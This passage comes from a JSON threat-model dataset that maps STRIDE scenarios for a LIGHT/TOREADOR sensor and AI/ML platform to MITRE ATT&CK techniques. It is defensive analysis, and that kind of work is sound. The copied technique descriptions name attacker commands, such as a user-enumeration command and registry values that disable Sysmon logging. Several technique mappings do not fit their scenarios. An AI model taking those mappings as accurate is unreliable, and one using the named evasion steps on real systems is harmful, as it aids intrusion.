                "technique_id": "T1036"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Sensitive data used for AI/ML model training is inadvertently exposed due to improper anonymization.",
            "Assumptions": [
                {
                    "Assumption": "Anonymization process has flaws or is not implemented correctly.",
                    "Role": "System Developer",
                    "Condition": "Errors in anonymization logic or implementation."
                },
                {
                    "Assumption": "No verification of anonymization effectiveness.",
                    "Role": "Data Compliance Officer",
                    "Condition": "Lack of validation processes for anonymization."
                },
                {
                    "Assumption": "No real-time monitoring for data exposure.",
                    "Role": "Security Administrator",
                    "Condition": "Absence of data exposure monitoring tools."
                }
            ],
            "Potential Impact": "Data confidentiality is compromised, leading to possible legal and reputational damage.",
            "MITRE ATT&CK Keywords": [
                "anonymization failure",
                "data exposure",
                "training data",
                "information disclosure"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker launches a DDoS attack on the LIGHT ICT infrastructure.",
            "Assumptions": [
                {
                    "Assumption": "The LIGHT ICT infrastructure is not adequately protected against DDoS attacks.",
                    "Role": "Network Administrator",
                    "Condition": "Lack of DDoS mitigation tools or strategies."
                },
                {
                    "Assumption": "The attacker has access to a botnet capable of generating significant traffic.",
                    "Role": "Attacker",
                    "Condition": "Availability of resources like compromised devices to launch an attack."
                },
                {
                    "Assumption": "No real-time traffic monitoring and anomaly detection.",
                    "Role": "Security Administrator",
                    "Condition": "Absence of effective traffic analysis tools."
                }
            ],
            "Potential Impact": "System availability is compromised, potentially disrupting predictive maintenance and power flow optimization.",
            "MITRE ATT&CK Keywords": [
                "DDoS",
                "network",
                "availability",
                "infrastructure attack"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "A malware infects the Data Logger causing it to crash repeatedly.",
            "Assumptions": [
                {
                    "Assumption": "The Data Logger lacks adequate malware protection.",
                    "Role": "System Administrator",
                    "Condition": "No antivirus or anti-malware solutions are installed."
                },
                {
                    "Assumption": "The attacker identifies a vulnerability in the Data Logger's software.",
                    "Role": "Attacker",
                    "Condition": "Knowledge of or discovery of exploitable vulnerabilities."
                },
                {
                    "Assumption": "No effective patch management process in place.",
                    "Role": "Security Administrator",
                    "Condition": "Infrequent or ineffective patch implementation."
                }
            ],
            "Potential Impact": "System availability and data integrity are compromised, impacting predictive capabilities.",
            "MITRE ATT&CK Keywords": [
                "malware",
                "system crash",
                "denial of service",
                "data logger"
            ],
            "mitre_technique": {
                "name": "Disk Structure Wipe",
                "description": "Adversaries may corrupt or wipe the disk data structures on a hard drive necessary to boot a system; targeting specific critical systems or in large numbers in a network to interrupt availability to system and network resources. \n\nAdversaries may attempt to render the system unable to boot by overwriting critical data located in structures such as the master boot record (MBR) or partition table.(Citation: Symantec Shamoon 2012)(Citation: FireEye Shamoon Nov 2016)(Citation: Palo Alto Shamoon Nov 2016)(Citation: Kaspersky StoneDrill 2017)(Citation: Unit 42 Shamoon3 2018) The data contained in disk structures may include the initial executable code for loading an operating system or the location of the file system partitions on disk. If this information is not present, the computer will not be able to load an operating system during the boot process, leaving the computer unavailable. [Disk Structure Wipe](https://attack.mitre.org/techniques/T1561/002) may be performed in isolation, or along with [Disk Content Wipe](https://attack.mitre.org/techniques/T1561/001) if all sectors of a disk are wiped.\n\nOn a network devices, adversaries may reformat the file system using [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) commands such as `format`.(Citation: format_cmd_cisco)\n\nTo maximize impact on the target organization, malware designed for destroying disk structures may have worm-like features to propagate across a network by leveraging other techniques like [Valid Accounts](https://attack.mitre.org/techniques/T1078), [OS Credential Dumping](https://attack.mitre.org/techniques/T1003), and [SMB/Windows Admin Shares](https://attack.mitre.org/techniques/T1021/002).(Citation: Symantec Shamoon 2012)(Citation: FireEye Shamoon Nov 2016)(Citation: Palo Alto Shamoon Nov 2016)(Citation: Kaspersky StoneDrill 2017)",
                "id": "attack-pattern--0af0ca99-357d-4ba1-805f-674fdfb7bef9",
                "technique_id": "T1561.002"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker exploits a zero-day vulnerability in the TOREADOR platform to disrupt AI/ML model training.",
            "Assumptions": [
                {
                    "Assumption": "The platform has unpatched zero-day vulnerabilities.",
                    "Role": "System Developer",
                    "Condition": "Undisclosed or unpatched vulnerabilities exist within the platform."
                },
                {
                    "Assumption": "The attacker has the capability to exploit these vulnerabilities.",
                    "Role": "Attacker",
                    "Condition": "Possession of necessary tools or scripts to exploit the vulnerability."
                },
                {
                    "Assumption": "There is no intrusion detection in place for the TOREADOR platform.",
                    "Role": "Security Administrator",
                    "Condition": "Lack of or ineffective intrusion detection systems."
                }
            ],
            "Potential Impact": "System availability is compromised, halting AI/ML model activities.",
            "MITRE ATT&CK Keywords": [
                "zero-day",
                "vulnerability",
                "denial of service",
                "dependency"
            ],
            "mitre_technique": {
                "name": "Application or System Exploitation",
                "description": "Adversaries may exploit software vulnerabilities that can cause an application or system to crash and deny availability to users. (Citation: Sucuri BIND9 August 2015) Some systems may automatically restart critical applications and services when crashes occur, but they can likely be re-exploited to cause a persistent denial of service (DoS) condition.\n\nAdversaries may exploit known or zero-day vulnerabilities to crash applications and/or systems, which may also lead to dependent applications and/or systems to be in a DoS condition. Crashed or restarted applications or systems may also have other effects such as [Data Destruction](https://attack.mitre.org/techniques/T1485), [Firmware Corruption](https://attack.mitre.org/techniques/T1495), [Service Stop](https://attack.mitre.org/techniques/T1489) etc. which may further cause a DoS condition and deny availability to critical information, applications and/or systems. ",
                "id": "attack-pattern--2bee5ffb-7a7a-4119-b1f2-158151b19ac0",
                "technique_id": "T1499.004"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker exploits a vulnerability in the Dashboard to gain administrative access.",
            "Assumptions": [
                {
                    "Assumption": "The Dashboard has existing vulnerabilities.",
                    "Role": "System Developer",
                    "Condition": "Unpatched or undiscovered security flaws."
                },
                {
                    "Assumption": "The attacker has the capability to find and exploit such vulnerabilities.",
                    "Role": "Attacker",
                    "Condition": "Access to exploitation tools or knowledge of exploits."
                },
                {
                    "Assumption": "No multi-layered security checks for administrative access.",
                    "Role": "Security Administrator",
                    "Condition": "Single point of authentication for admin access."
                }
            ],
            "Potential Impact": "Data confidentiality, integrity, and availability are compromised, leading to potential system-wide effects.",
            "MITRE ATT&CK Keywords": [
                "privilege escalation",
                "dashboard",
                "vulnerability exploitation",
                "admin access"
            ],
            "mitre_technique": {
                "name": "External Remote Services",
                "description": "Adversaries may leverage external-facing remote services to initially access and/or persist within a network. Remote services such as VPNs, Citrix, and other access mechanisms allow users to connect to internal enterprise network resources from external locations. There are often remote service gateways that manage connections and credential authentication for these services. Services such as [Windows Remote Management](https://attack.mitre.org/techniques/T1021/006) and [VNC](https://attack.mitre.org/techniques/T1021/005) can also be used externally.(Citation: MacOS VNC software for Remote Desktop)\n\nAccess to [Valid Accounts](https://attack.mitre.org/techniques/T1078) to use the service is often a requirement, which could be obtained through credential pharming or by obtaining the credentials from users after compromising the enterprise network.(Citation: Volexity Virtual Private Keylogging) Access to remote services may be used as a redundant or persistent access mechanism during an operation.\n\nAccess may also be gained through an exposed service that doesn\u2019t require authentication. In containerized environments, this may include an exposed Docker API, Kubernetes API server, kubelet, or web application such as the Kubernetes dashboard.(Citation: Trend Micro Exposed Docker Server)(Citation: Unit 42 Hildegard Malware)",
                "id": "attack-pattern--10d51417-ee35-4589-b1ff-b6df1c334e8d",
                "technique_id": "T1133"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An insider uses legitimate but unauthorized access pathways to obtain higher privileges.",
            "Assumptions": [
                {
                    "Assumption": "Access controls do not strictly enforce least privilege principles.",
                    "Role": "System Administrator",
                    "Condition": "Broad access permissions."
                },
                {
                    "Assumption": "No fine-grained access control policies are in place.",
                    "Role": "Security Administrator",
                    "Condition": "Lack of detailed access policies."
                },
                {
                    "Assumption": "No monitoring for unauthorized privilege escalation.",
                    "Role": "Security Administrator",
                    "Condition": "Absence of real-time monitoring and alerts."
                }
            ],
            "Potential Impact": "Data confidentiality, integrity, and availability are compromised by unauthorized actions.",
            "MITRE ATT&CK Keywords": [
                "insider threat",
                "privilege escalation",
                "access control",
                "unauthorized access"
            ],
            "mitre_technique": {
                "name": "File System Permissions Weakness",
                "description": "Processes may automatically execute specific binaries as part of their functionality or to perform other actions. If the permissions on the file system directory containing a target binary, or permissions on the binary itself, are improperly set, then the target binary may be overwritten with another binary using user-level permissions and executed by the original process. If the original process and thread are running under a higher permissions level, then the replaced binary will also execute under higher-level permissions, which could include SYSTEM.\n\nAdversaries may use this technique to replace legitimate binaries with malicious ones as a means of executing code at a higher permissions level. If the executing process is set to run at a specific time or during a certain event (e.g., system bootup) then this technique can also be used for persistence.\n\n### Services\n\nManipulation of Windows service binaries is one variation of this technique. Adversaries may replace a legitimate service executable with their own executable to gain persistence and/or privilege escalation to the account context the service is set to execute under (local/domain account, SYSTEM, LocalService, or NetworkService). Once the service is started, either directly by the user (if appropriate access is available) or through some other means, such as a system restart if the service starts on bootup, the replaced executable will run instead of the original service executable.\n\n### Executable Installers\n\nAnother variation of this technique can be performed by taking advantage of a weakness that is common in executable, self-extracting installers. During the installation process, it is common for installers to use a subdirectory within the <code>%TEMP%</code> directory to unpack binaries such as DLLs, EXEs, or other payloads. When installers create subdirectories and files they often do not set appropriate permissions to restrict write access, which allows for execution of untrusted code placed in the subdirectories or overwriting of binaries used in the installation process. This behavior is related to and may take advantage of [DLL Search Order Hijacking](https://attack.mitre.org/techniques/T1038). Some installers may also require elevated privileges that will result in privilege escalation when executing adversary controlled code. This behavior is related to [Bypass User Account Control](https://attack.mitre.org/techniques/T1088). Several examples of this weakness in existing common installers have been reported to software vendors. (Citation: Mozilla Firefox Installer DLL Hijack) (Citation: Seclists Kanthak 7zip Installer)",
                "id": "attack-pattern--0ca7beef-9bbc-4e35-97cf-437384ddce6a",
                "technique_id": "T1044"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "Malware infects sensors and spreads through the LIGHT-TOREADOR infrastructure, escalating privileges at each stage.",
            "Assumptions": [
                {
                    "Assumption": "Sensors and other devices lack adequate malware protection.",
                    "Role": "System Administrator",
                    "Condition": "No or insufficient antivirus/anti-malware solutions deployed."
                },
                {
                    "Assumption": "The infrastructure does not adequately segment privileged and non-privileged components.",
                    "Role": "System Architect",
                    "Condition": "Lack of network segmentation and isolation."
                },
                {
                    "Assumption": "No anomaly detection to identify malicious behavior.",
                    "Role": "Security Administrator",
                    "Condition": "Absence of or ineffective anomaly detection systems."
                }
            ],
            "Potential Impact": "Data confidentiality, integrity, and availability are compromised, impacting overall system security.",
            "MITRE ATT&CK Keywords": [
                "malware",
                "infrastructure",
                "privilege escalation",
                "system compromise"
            ],
            "mitre_technique": {
                "name": "System Owner/User Discovery",
                "description": "Adversaries may attempt to identify the primary user, currently logged in user, set of users that commonly uses a system, or whether a user is actively using the system. They may do this, for example, by retrieving account usernames or by using [OS Credential Dumping](https://attack.mitre.org/techniques/T1003). The information may be collected in a number of different ways using other Discovery techniques, because user and username details are prevalent throughout a system and include running process ownership, file/directory ownership, session information, and system logs. Adversaries may use the information from [System Owner/User Discovery](https://attack.mitre.org/techniques/T1033) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\nVarious utilities and commands may acquire this information, including <code>whoami</code>. In macOS and Linux, the currently logged in user can be identified with <code>w</code> and <code>who</code>. On macOS the <code>dscl . list /Users | grep -v '_'</code> command can also be used to enumerate user accounts. Environment variables, such as <code>%USERNAME%</code> and <code>$USER</code>, may also be used to access this information.\n\nOn network devices, [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) commands such as `show users` and `show ssh` can be used to display users currently logged into the device.(Citation: show_ssh_users_cmd_cisco)(Citation: US-CERT TA18-106A Network Infrastructure Devices 2018)",
                "id": "attack-pattern--03d7999c-1f4c-42cc-8373-e7690d318104",
                "technique_id": "T1033"
            }
        }
    ]
},
{
    "case_number": "9",
    "batch_number": "24",
    "threats": [
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker could spoof the sensor readings by mimicking sensor data sent to the Data Logger.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has access to the network communication channels between the sensors and the Data Logger.",
                    "Role": "Attacker",
                    "Condition": "Valid only if network security is weak or compromised."
                },
                {
                    "Assumption": "The attacker can successfully reverse-engineer the data communication protocol used by the sensors.",
                    "Role": "Attacker",
                    "Condition": "Valid if protocol encryption is weak or absent."
                },
                {
                    "Assumption": "The attacker can inject data without being detected by intrusion detection systems.",
                    "Role": "Attacker",
                    "Condition": "Valid if there are no proper intrusion detection mechanisms in place."
                }
            ],
            "Potential Impact": "Unauthorized sensor data leads to incorrect AI predictions, causing potential hardware failure and power flow issues.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "network",
                "device",
                "data injection",
                "sensor"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker spoofs the identity of a valid employee to access the Dashboard.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has discovered or guessed valid login credentials.",
                    "Role": "Attacker",
                    "Condition": "Valid if credentials are weak, reused, or leaked."
                },
                {
                    "Assumption": "There is no multi-factor authentication (MFA) in place.",
                    "Role": "System Administrator",
                    "Condition": "Valid if MFA is not implemented."
                },
                {
                    "Assumption": "Logging and monitoring are not sufficient to detect the spoofed identity.",
                    "Role": "System Administrator",
                    "Condition": "Valid if monitoring systems are inadequate."
                }
            ],
            "Potential Impact": "Attacker gains unauthorized access to sensitive data and AI/ML predictions, leading to potential data breaches and manipulation.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "web application",
                "credential theft",
                "user impersonation"
            ],
            "mitre_technique": {
                "name": "Steal Web Session Cookie",
                "description": "An adversary may steal web application or service session cookies and use them to gain access to web applications or Internet services as an authenticated user without needing credentials. Web applications and services often use session cookies as an authentication token after a user has authenticated to a website.\n\nCookies are often valid for an extended period of time, even if the web application is not actively used. Cookies can be found on disk, in the process memory of the browser, and in network traffic to remote systems. Additionally, other applications on the targets machine might store sensitive authentication cookies in memory (e.g. apps which authenticate to cloud services). Session cookies can be used to bypasses some multi-factor authentication protocols.(Citation: Pass The Cookie)\n\nThere are several examples of malware targeting cookies from web browsers on the local system.(Citation: Kaspersky TajMahal April 2019)(Citation: Unit 42 Mac Crypto Cookies January 2019) Adversaries may also steal cookies by injecting malicious JavaScript content into websites or relying on [User Execution](https://attack.mitre.org/techniques/T1204) by tricking victims into running malicious JavaScript in their browser.(Citation: Talos Roblox Scam 2023)(Citation: Krebs Discord Bookmarks 2023)\n\nThere are also open source frameworks such as `Evilginx2` and `Muraena` that can gather session cookies through a malicious proxy (e.g., [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557)) that can be set up by an adversary and used in phishing campaigns.(Citation: Github evilginx2)(Citation: GitHub Mauraena)\n\nAfter an adversary acquires a valid cookie, they can then perform a [Web Session Cookie](https://attack.mitre.org/techniques/T1550/004) technique to login to the corresponding web application.",
                "id": "attack-pattern--10ffac09-e42d-4f56-ab20-db94c67d76ff",
                "technique_id": "T1539"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "A malicious actor uses a compromised Anonymity Agent to inject malformed data into the TOREADOR platform.",
            "Assumptions": [
                {
                    "Assumption": "The Anonymity Agent has exploitable vulnerabilities.",
                    "Role": "Developer/Security Team",
                    "Condition": "Valid if software patches and updates are not current."
                },
                {
                    "Assumption": "The attacker has gained some level of access to the system hosting the Anonymity Agent.",
                    "Role": "Attacker",
                    "Condition": "Valid if system access controls are weak."
                },
                {
                    "Assumption": "There is no input validation on data being sent to the TOREADOR platform.",
                    "Role": "System Administrator",
                    "Condition": "Valid if input validation mechanisms are not implemented."
                }
            ],
            "Potential Impact": "Corrupt data may lead to erroneous AI/ML model training and unreliable predictive maintenance.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "data injection",
                "anonymity agent",
                "input manipulation"
            ],
            "mitre_technique": {
                "name": "Process Argument Spoofing",
                "description": "Adversaries may attempt to hide process command-line arguments by overwriting process memory. Process command-line arguments are stored in the process environment block (PEB), a data structure used by Windows to store various information about/used by a process. The PEB includes the process command-line arguments that are referenced when executing the process. When a process is created, defensive tools/sensors that monitor process creations may retrieve the process arguments from the PEB.(Citation: Microsoft PEB 2021)(Citation: Xpn Argue Like Cobalt 2019)\n\nAdversaries may manipulate a process PEB to evade defenses. For example, [Process Hollowing](https://attack.mitre.org/techniques/T1055/012) can be abused to spawn a process in a suspended state with benign arguments. After the process is spawned and the PEB is initialized (and process information is potentially logged by tools/sensors), adversaries may override the PEB to modify the command-line arguments (ex: using the [Native API](https://attack.mitre.org/techniques/T1106) <code>WriteProcessMemory()</code> function) then resume process execution with malicious arguments.(Citation: Cobalt Strike Arguments 2019)(Citation: Xpn Argue Like Cobalt 2019)(Citation: Nviso Spoof Command Line 2020)\n\nAdversaries may also execute a process with malicious command-line arguments then patch the memory with benign arguments that may bypass subsequent process memory analysis.(Citation: FireEye FiveHands April 2021)\n\nThis behavior may also be combined with other tricks (such as [Parent PID Spoofing](https://attack.mitre.org/techniques/T1134/004)) to manipulate or further evade process-based detections.",
                "id": "attack-pattern--ffe59ad3-ad9b-4b9f-b74f-5beb3c309dc1",
                "technique_id": "T1564.010"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker could tamper with the data collected by the Data Logger before it is sent to the central system.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has physical access to the Data Logger.",
                    "Role": "Attacker",
                    "Condition": "Valid if physical security controls are inadequate."
                },
                {
                    "Assumption": "Data is not sufficiently encrypted at rest or in transit.",
                    "Role": "System Administrator",
                    "Condition": "Valid if encryption standards are not enforced."
                },
                {
                    "Assumption": "There is no tamper-evident hardware or logging mechanism.",
                    "Role": "Security Team",
                    "Condition": "Valid if hardware lacks tamper evidence features."
                }
            ],
            "Potential Impact": "Integrity and accuracy of sensor data are compromised, leading to incorrect predictions and potential system failures.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "data logger",
                "data integrity",
                "physical access"
            ],
            "mitre_technique": {
                "name": "Disable or Modify Tools",
                "description": "Adversaries may modify and/or disable security tools to avoid possible detection of their malware/tools and activities. This may take many forms, such as killing security software processes or services, modifying / deleting Registry keys or configuration files so that tools do not operate properly, or other methods to interfere with security tools scanning or reporting information. Adversaries may also disable updates to prevent the latest security patches from reaching tools on victim systems.(Citation: SCADAfence_ransomware)\n\nAdversaries may also tamper with artifacts deployed and utilized by security tools. Security tools may make dynamic changes to system components in order to maintain visibility into specific events. For example, security products may load their own modules and/or modify those loaded by processes to facilitate data collection. Similar to [Indicator Blocking](https://attack.mitre.org/techniques/T1562/006), adversaries may unhook or otherwise modify these features added by tools (especially those that exist in userland or are otherwise potentially accessible to adversaries) to avoid detection.(Citation: OutFlank System Calls)(Citation: MDSec System Calls) \n\nAdversaries may also focus on specific applications such as Sysmon. For example, the \u201cStart\u201d and \u201cEnable\u201d values in <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Microsoft-Windows-Sysmon-Operational</code> may be modified to tamper with and potentially disable Sysmon logging.(Citation: disable_win_evt_logging) \n\nOn network devices, adversaries may attempt to skip digital signature verification checks by altering startup configuration files and effectively disabling firmware verification that typically occurs at boot.(Citation: Fortinet Zero-Day and Custom Malware Used by Suspected Chinese Actor in Espionage Operation)(Citation: Analysis of FG-IR-22-369)\n\nIn cloud environments, tools disabled by adversaries may include cloud monitoring agents that report back to services such as AWS CloudWatch or Google Cloud Monitor.\n\nFurthermore, although defensive tools may have anti-tampering mechanisms, adversaries may abuse tools such as legitimate rootkit removal kits to impair and/or disable these tools.(Citation: chasing_avaddon_ransomware)(Citation: dharma_ransomware)(Citation: demystifying_ryuk)(Citation: doppelpaymer_crowdstrike) For example, adversaries have used tools such as GMER to find and shut down hidden processes and antivirus software on infected systems.(Citation: demystifying_ryuk)\n\nAdditionally, adversaries may exploit legitimate drivers from anti-virus software to gain access to kernel space (i.e. [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068)), which may lead to bypassing anti-tampering features.(Citation: avoslocker_ransomware)",
                "id": "attack-pattern--ac08589e-ee59-4935-8667-d845e38fe579",
                "technique_id": "T1562.001"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An insider with access to the TOREADOR platform could tamper with AI/ML model parameters.",
            "Assumptions": [
                {
                    "Assumption": "The actor has legitimate access to the model training environment.",
                    "Role": "Insider",
                    "Condition": "Valid if access controls are weak."
                },
                {
                    "Assumption": "There is no version control or audit trail for changes to the AI/ML models.",
                    "Role": "System Administrator",
                    "Condition": "Valid if version control is not implemented."
                },
                {
                    "Assumption": "Security policies do not include segregation of duties.",
                    "Role": "IT Policy Maker",
                    "Condition": "Valid if policies are inadequate."
                }
            ],
            "Potential Impact": "Manipulated models lead to incorrect predictions, potentially causing hardware failures and inefficient power management.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "AI/ML models",
                "insider threat",
                "parameter manipulation"
            ],
            "mitre_technique": {
                "name": "Disable or Modify Tools",
                "description": "Adversaries may modify and/or disable security tools to avoid possible detection of their malware/tools and activities. This may take many forms, such as killing security software processes or services, modifying / deleting Registry keys or configuration files so that tools do not operate properly, or other methods to interfere with security tools scanning or reporting information. Adversaries may also disable updates to prevent the latest security patches from reaching tools on victim systems.(Citation: SCADAfence_ransomware)\n\nAdversaries may also tamper with artifacts deployed and utilized by security tools. Security tools may make dynamic changes to system components in order to maintain visibility into specific events. For example, security products may load their own modules and/or modify those loaded by processes to facilitate data collection. Similar to [Indicator Blocking](https://attack.mitre.org/techniques/T1562/006), adversaries may unhook or otherwise modify these features added by tools (especially those that exist in userland or are otherwise potentially accessible to adversaries) to avoid detection.(Citation: OutFlank System Calls)(Citation: MDSec System Calls) \n\nAdversaries may also focus on specific applications such as Sysmon. For example, the \u201cStart\u201d and \u201cEnable\u201d values in <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Microsoft-Windows-Sysmon-Operational</code> may be modified to tamper with and potentially disable Sysmon logging.(Citation: disable_win_evt_logging) \n\nOn network devices, adversaries may attempt to skip digital signature verification checks by altering startup configuration files and effectively disabling firmware verification that typically occurs at boot.(Citation: Fortinet Zero-Day and Custom Malware Used by Suspected Chinese Actor in Espionage Operation)(Citation: Analysis of FG-IR-22-369)\n\nIn cloud environments, tools disabled by adversaries may include cloud monitoring agents that report back to services such as AWS CloudWatch or Google Cloud Monitor.\n\nFurthermore, although defensive tools may have anti-tampering mechanisms, adversaries may abuse tools such as legitimate rootkit removal kits to impair and/or disable these tools.(Citation: chasing_avaddon_ransomware)(Citation: dharma_ransomware)(Citation: demystifying_ryuk)(Citation: doppelpaymer_crowdstrike) For example, adversaries have used tools such as GMER to find and shut down hidden processes and antivirus software on infected systems.(Citation: demystifying_ryuk)\n\nAdditionally, adversaries may exploit legitimate drivers from anti-virus software to gain access to kernel space (i.e. [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068)), which may lead to bypassing anti-tampering features.(Citation: avoslocker_ransomware)",
                "id": "attack-pattern--ac08589e-ee59-4935-8667-d845e38fe579",
                "technique_id": "T1562.001"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker could compromise the Metadata component to tamper with contextual metadata used by the predictive models.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has been able to compromise the system that manages metadata.",
                    "Role": "Attacker",
                    "Condition": "Valid if system vulnerabilities are exploited."
                },
                {
                    "Assumption": "Metadata integrity is not verified before use by the models.",
                    "Role": "System Administrator",
                    "Condition": "Valid if data integrity checks are not implemented."
                },
                {
                    "Assumption": "There are insufficient alerts for metadata changes.",
                    "Role": "Security Team",
                    "Condition": "Valid if monitoring capabilities are lacking."
                }
            ],
            "Potential Impact": "Corrupt metadata can lead to incorrect AI/ML model predictions and operational inefficiencies.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "metadata",
                "data integrity",
                "predictive models"
            ],
            "mitre_technique": {
                "name": "File/Path Exclusions",
                "description": "Adversaries may attempt to hide their file-based artifacts by writing them to specific folders or file names excluded from antivirus (AV) scanning and other defensive capabilities. AV and other file-based scanners often include exclusions to optimize performance as well as ease installation and legitimate use of applications. These exclusions may be contextual (e.g., scans are only initiated in response to specific triggering events/alerts), but are also often hardcoded strings referencing specific folders and/or files assumed to be trusted and legitimate.(Citation: Microsoft File Folder Exclusions)\n\nAdversaries may abuse these exclusions to hide their file-based artifacts. For example, rather than  tampering with tool settings to add a new exclusion (i.e., [Disable or Modify Tools](https://attack.mitre.org/techniques/T1562/001)), adversaries may drop their file-based payloads in default or otherwise well-known exclusions. Adversaries may also use [Security Software Discovery](https://attack.mitre.org/techniques/T1518/001) and other [Discovery](https://attack.mitre.org/tactics/TA0007)/[Reconnaissance](https://attack.mitre.org/tactics/TA0043) activities to both discover and verify existing exclusions in a victim environment.",
                "id": "attack-pattern--09b008a9-b4eb-462a-a751-a0eb58050cd9",
                "technique_id": "T1564.012"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An employee could deny having made configuration changes in the TOREADOR platform due to the lack of logging.",
            "Assumptions": [
                {
                    "Assumption": "System changes are not adequately logged.",
                    "Role": "System Administrator",
                    "Condition": "Valid if logging mechanisms are absent or not properly configured."
                },
                {
                    "Assumption": "Employee access is not tracked with unique identifiers.",
                    "Role": "HR/IT Department",
                    "Condition": "Valid if user access controls are not in place."
                },
                {
                    "Assumption": "Security policies do not require user activity monitoring.",
                    "Role": "IT Policy Maker",
                    "Condition": "Valid if policies are inadequate."
                }
            ],
            "Potential Impact": "Difficulty in auditing system changes and holding individuals accountable, increasing the risk of unauthorized alterations.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "TOREADOR platform",
                "logging failure",
                "user activity"
            ],
            "mitre_technique": {
                "name": "Event Triggered Execution",
